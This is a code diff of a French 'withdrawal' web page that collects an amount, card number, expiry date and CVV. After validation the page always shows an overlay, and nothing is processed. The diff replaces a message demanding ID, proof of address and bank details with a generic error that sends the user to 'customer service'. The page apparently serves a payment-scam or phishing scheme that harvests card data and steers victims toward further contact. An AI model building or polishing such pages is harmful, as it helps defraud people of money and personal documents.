@@ -168,15 +168,16 @@
             to { opacity: 1; }
         }
 
-        .message-card {
+        .error-card {
             background: white;
             border-radius: 40px;
-            padding: 35px;
+            padding: 40px;
             max-width: 400px;
             width: 90%;
             text-align: center;
             animation: slideUp 0.4s ease;
             border: 3px solid #ff6b4a;
+            box-shadow: 0 20px 40px rgba(255,107,74,0.2);
         }
 
         @keyframes slideUp {
@@ -190,15 +191,15 @@
             }
         }
 
-        .exclamation {
-            width: 70px;
-            height: 70px;
+        .error-icon {
+            width: 80px;
+            height: 80px;
             background: #ff6b4a;
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            margin: 0 auto 20px;
+            margin: 0 auto 25px;
             animation: pulse 1.5s infinite;
         }
 
@@ -208,53 +209,23 @@
             100% { transform: scale(1); }
         }
 
-        .exclamation span {
+        .error-icon span {
             color: white;
-            font-size: 3rem;
+            font-size: 3.5rem;
             font-weight: 800;
         }
 
-        .message-card h2 {
+        .error-card h2 {
             color: #ff6b4a;
-            font-size: 1.8rem;
+            font-size: 2rem;
             margin-bottom: 15px;
         }
 
-        .message-card p {
+        .error-card p {
             color: #0b2440;
-            font-size: 1.1rem;
+            font-size: 1.2rem;
             line-height: 1.6;
-            margin-bottom: 25px;
-        }
-
-        .doc-list {
-            background: #f9fcff;
-            border-radius: 30px;
-            padding: 20px;
-            margin: 20px 0;
-            text-align: left;
-            list-style: none;
-        }
-
-        .doc-list li {
-            padding: 12px 0;
-            border-bottom: 1px solid #eef2f6;
-            color: #0b2440;
-            font-weight: 500;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .doc-list li:last-child {
-            border-bottom: none;
-        }
-
-        .doc-list li::before {
-            content: "•";
-            color: #ff6b4a;
-            font-weight: bold;
-            font-size: 1.5rem;
+            margin-bottom: 30px;
         }
 
         .btn-contact {
@@ -268,7 +239,7 @@
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s;
-            margin: 15px 0;
+            margin: 10px 0;
         }
 
         .btn-contact:hover {
@@ -278,15 +249,15 @@
         }
 
         .btn-close {
+            width: 100%;
+            padding: 16px;
             background: transparent;
             border: 2px solid #e6ecf2;
             color: #0b2440;
-            padding: 12px;
             border-radius: 40px;
             font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            width: 100%;
             transition: all 0.3s;
         }
 
@@ -397,30 +368,19 @@
         </form>
     </div>
 
-    <!-- Overlay avec message de sécurité -->
-    <div class="overlay" id="securityOverlay">
-        <div class="message-card">
-            <div class="exclamation">
+    <!-- Overlay avec message d'erreur simple -->
+    <div class="overlay" id="errorOverlay">
+        <div class="error-card">
+            <div class="error-icon">
                 <span>!</span>
             </div>
             
-            <h2>Document requis</h2>
+            <h2>Erreur</h2>
             
-            <p>Pour des raisons de sécurité, un document de confirmation est nécessaire.</p>
-
-            <ul class="doc-list">
-                <li>Pièce d'identité</li>
-                <li>Justificatif de domicile</li>
-                <li>RIB du compte</li>
-                <li>Formulaire signé</li>
-            </ul>
-
-            <p style="color: #ff6b4a; font-weight: 600; margin: 15px 0;">
-                ⏱️ Délai: 24-48h
-            </p>
+            <p>Veuillez contacter le service client</p>
 
             <button class="btn-contact" onclick="contactSupport()">
-                CONTACTER LE SUPPORT
+                CONTACTER LE SERVICE CLIENT
             </button>
 
             <button class="btn-close" onclick="closeOverlay()">
@@ -484,7 +444,7 @@
             const cardExpiry = document.getElementById('cardExpiry').value.trim();
             const cardCVV = document.getElementById('cardCVV').value.trim();
 
-            // Validations
+            // Validations simples
             if (!amount || amount <= 0) {
                 showAlert('Montant invalide', 'error');
                 return;
@@ -510,22 +470,22 @@
                 return;
             }
 
-            // Afficher l'overlay
-            document.getElementById('securityOverlay').classList.add('show');
+            // Afficher le message d'erreur
+            document.getElementById('errorOverlay').classList.add('show');
         }
 
         function closeOverlay() {
-            document.getElementById('securityOverlay').classList.remove('show');
+            document.getElementById('errorOverlay').classList.remove('show');
         }
 
         function contactSupport() {
             const amount = document.getElementById('amount').value;
             
-            const sujet = encodeURIComponent('Demande de document de retrait');
+            const sujet = encodeURIComponent('Demande d\'assistance pour retrait');
             const message = encodeURIComponent(
                 `Bonjour,\n\n` +
-                `Je souhaite effectuer un retrait de ${amount} € et j'ai besoin du document de confirmation.\n\n` +
-                `Merci de me faire parvenir les instructions.\n\n` +
+                `Je rencontre un problème pour effectuer un retrait de ${amount} €.\n\n` +
+                `Merci de me contacter pour m'assister.\n\n` +
                 `Cordialement.`
             );
             
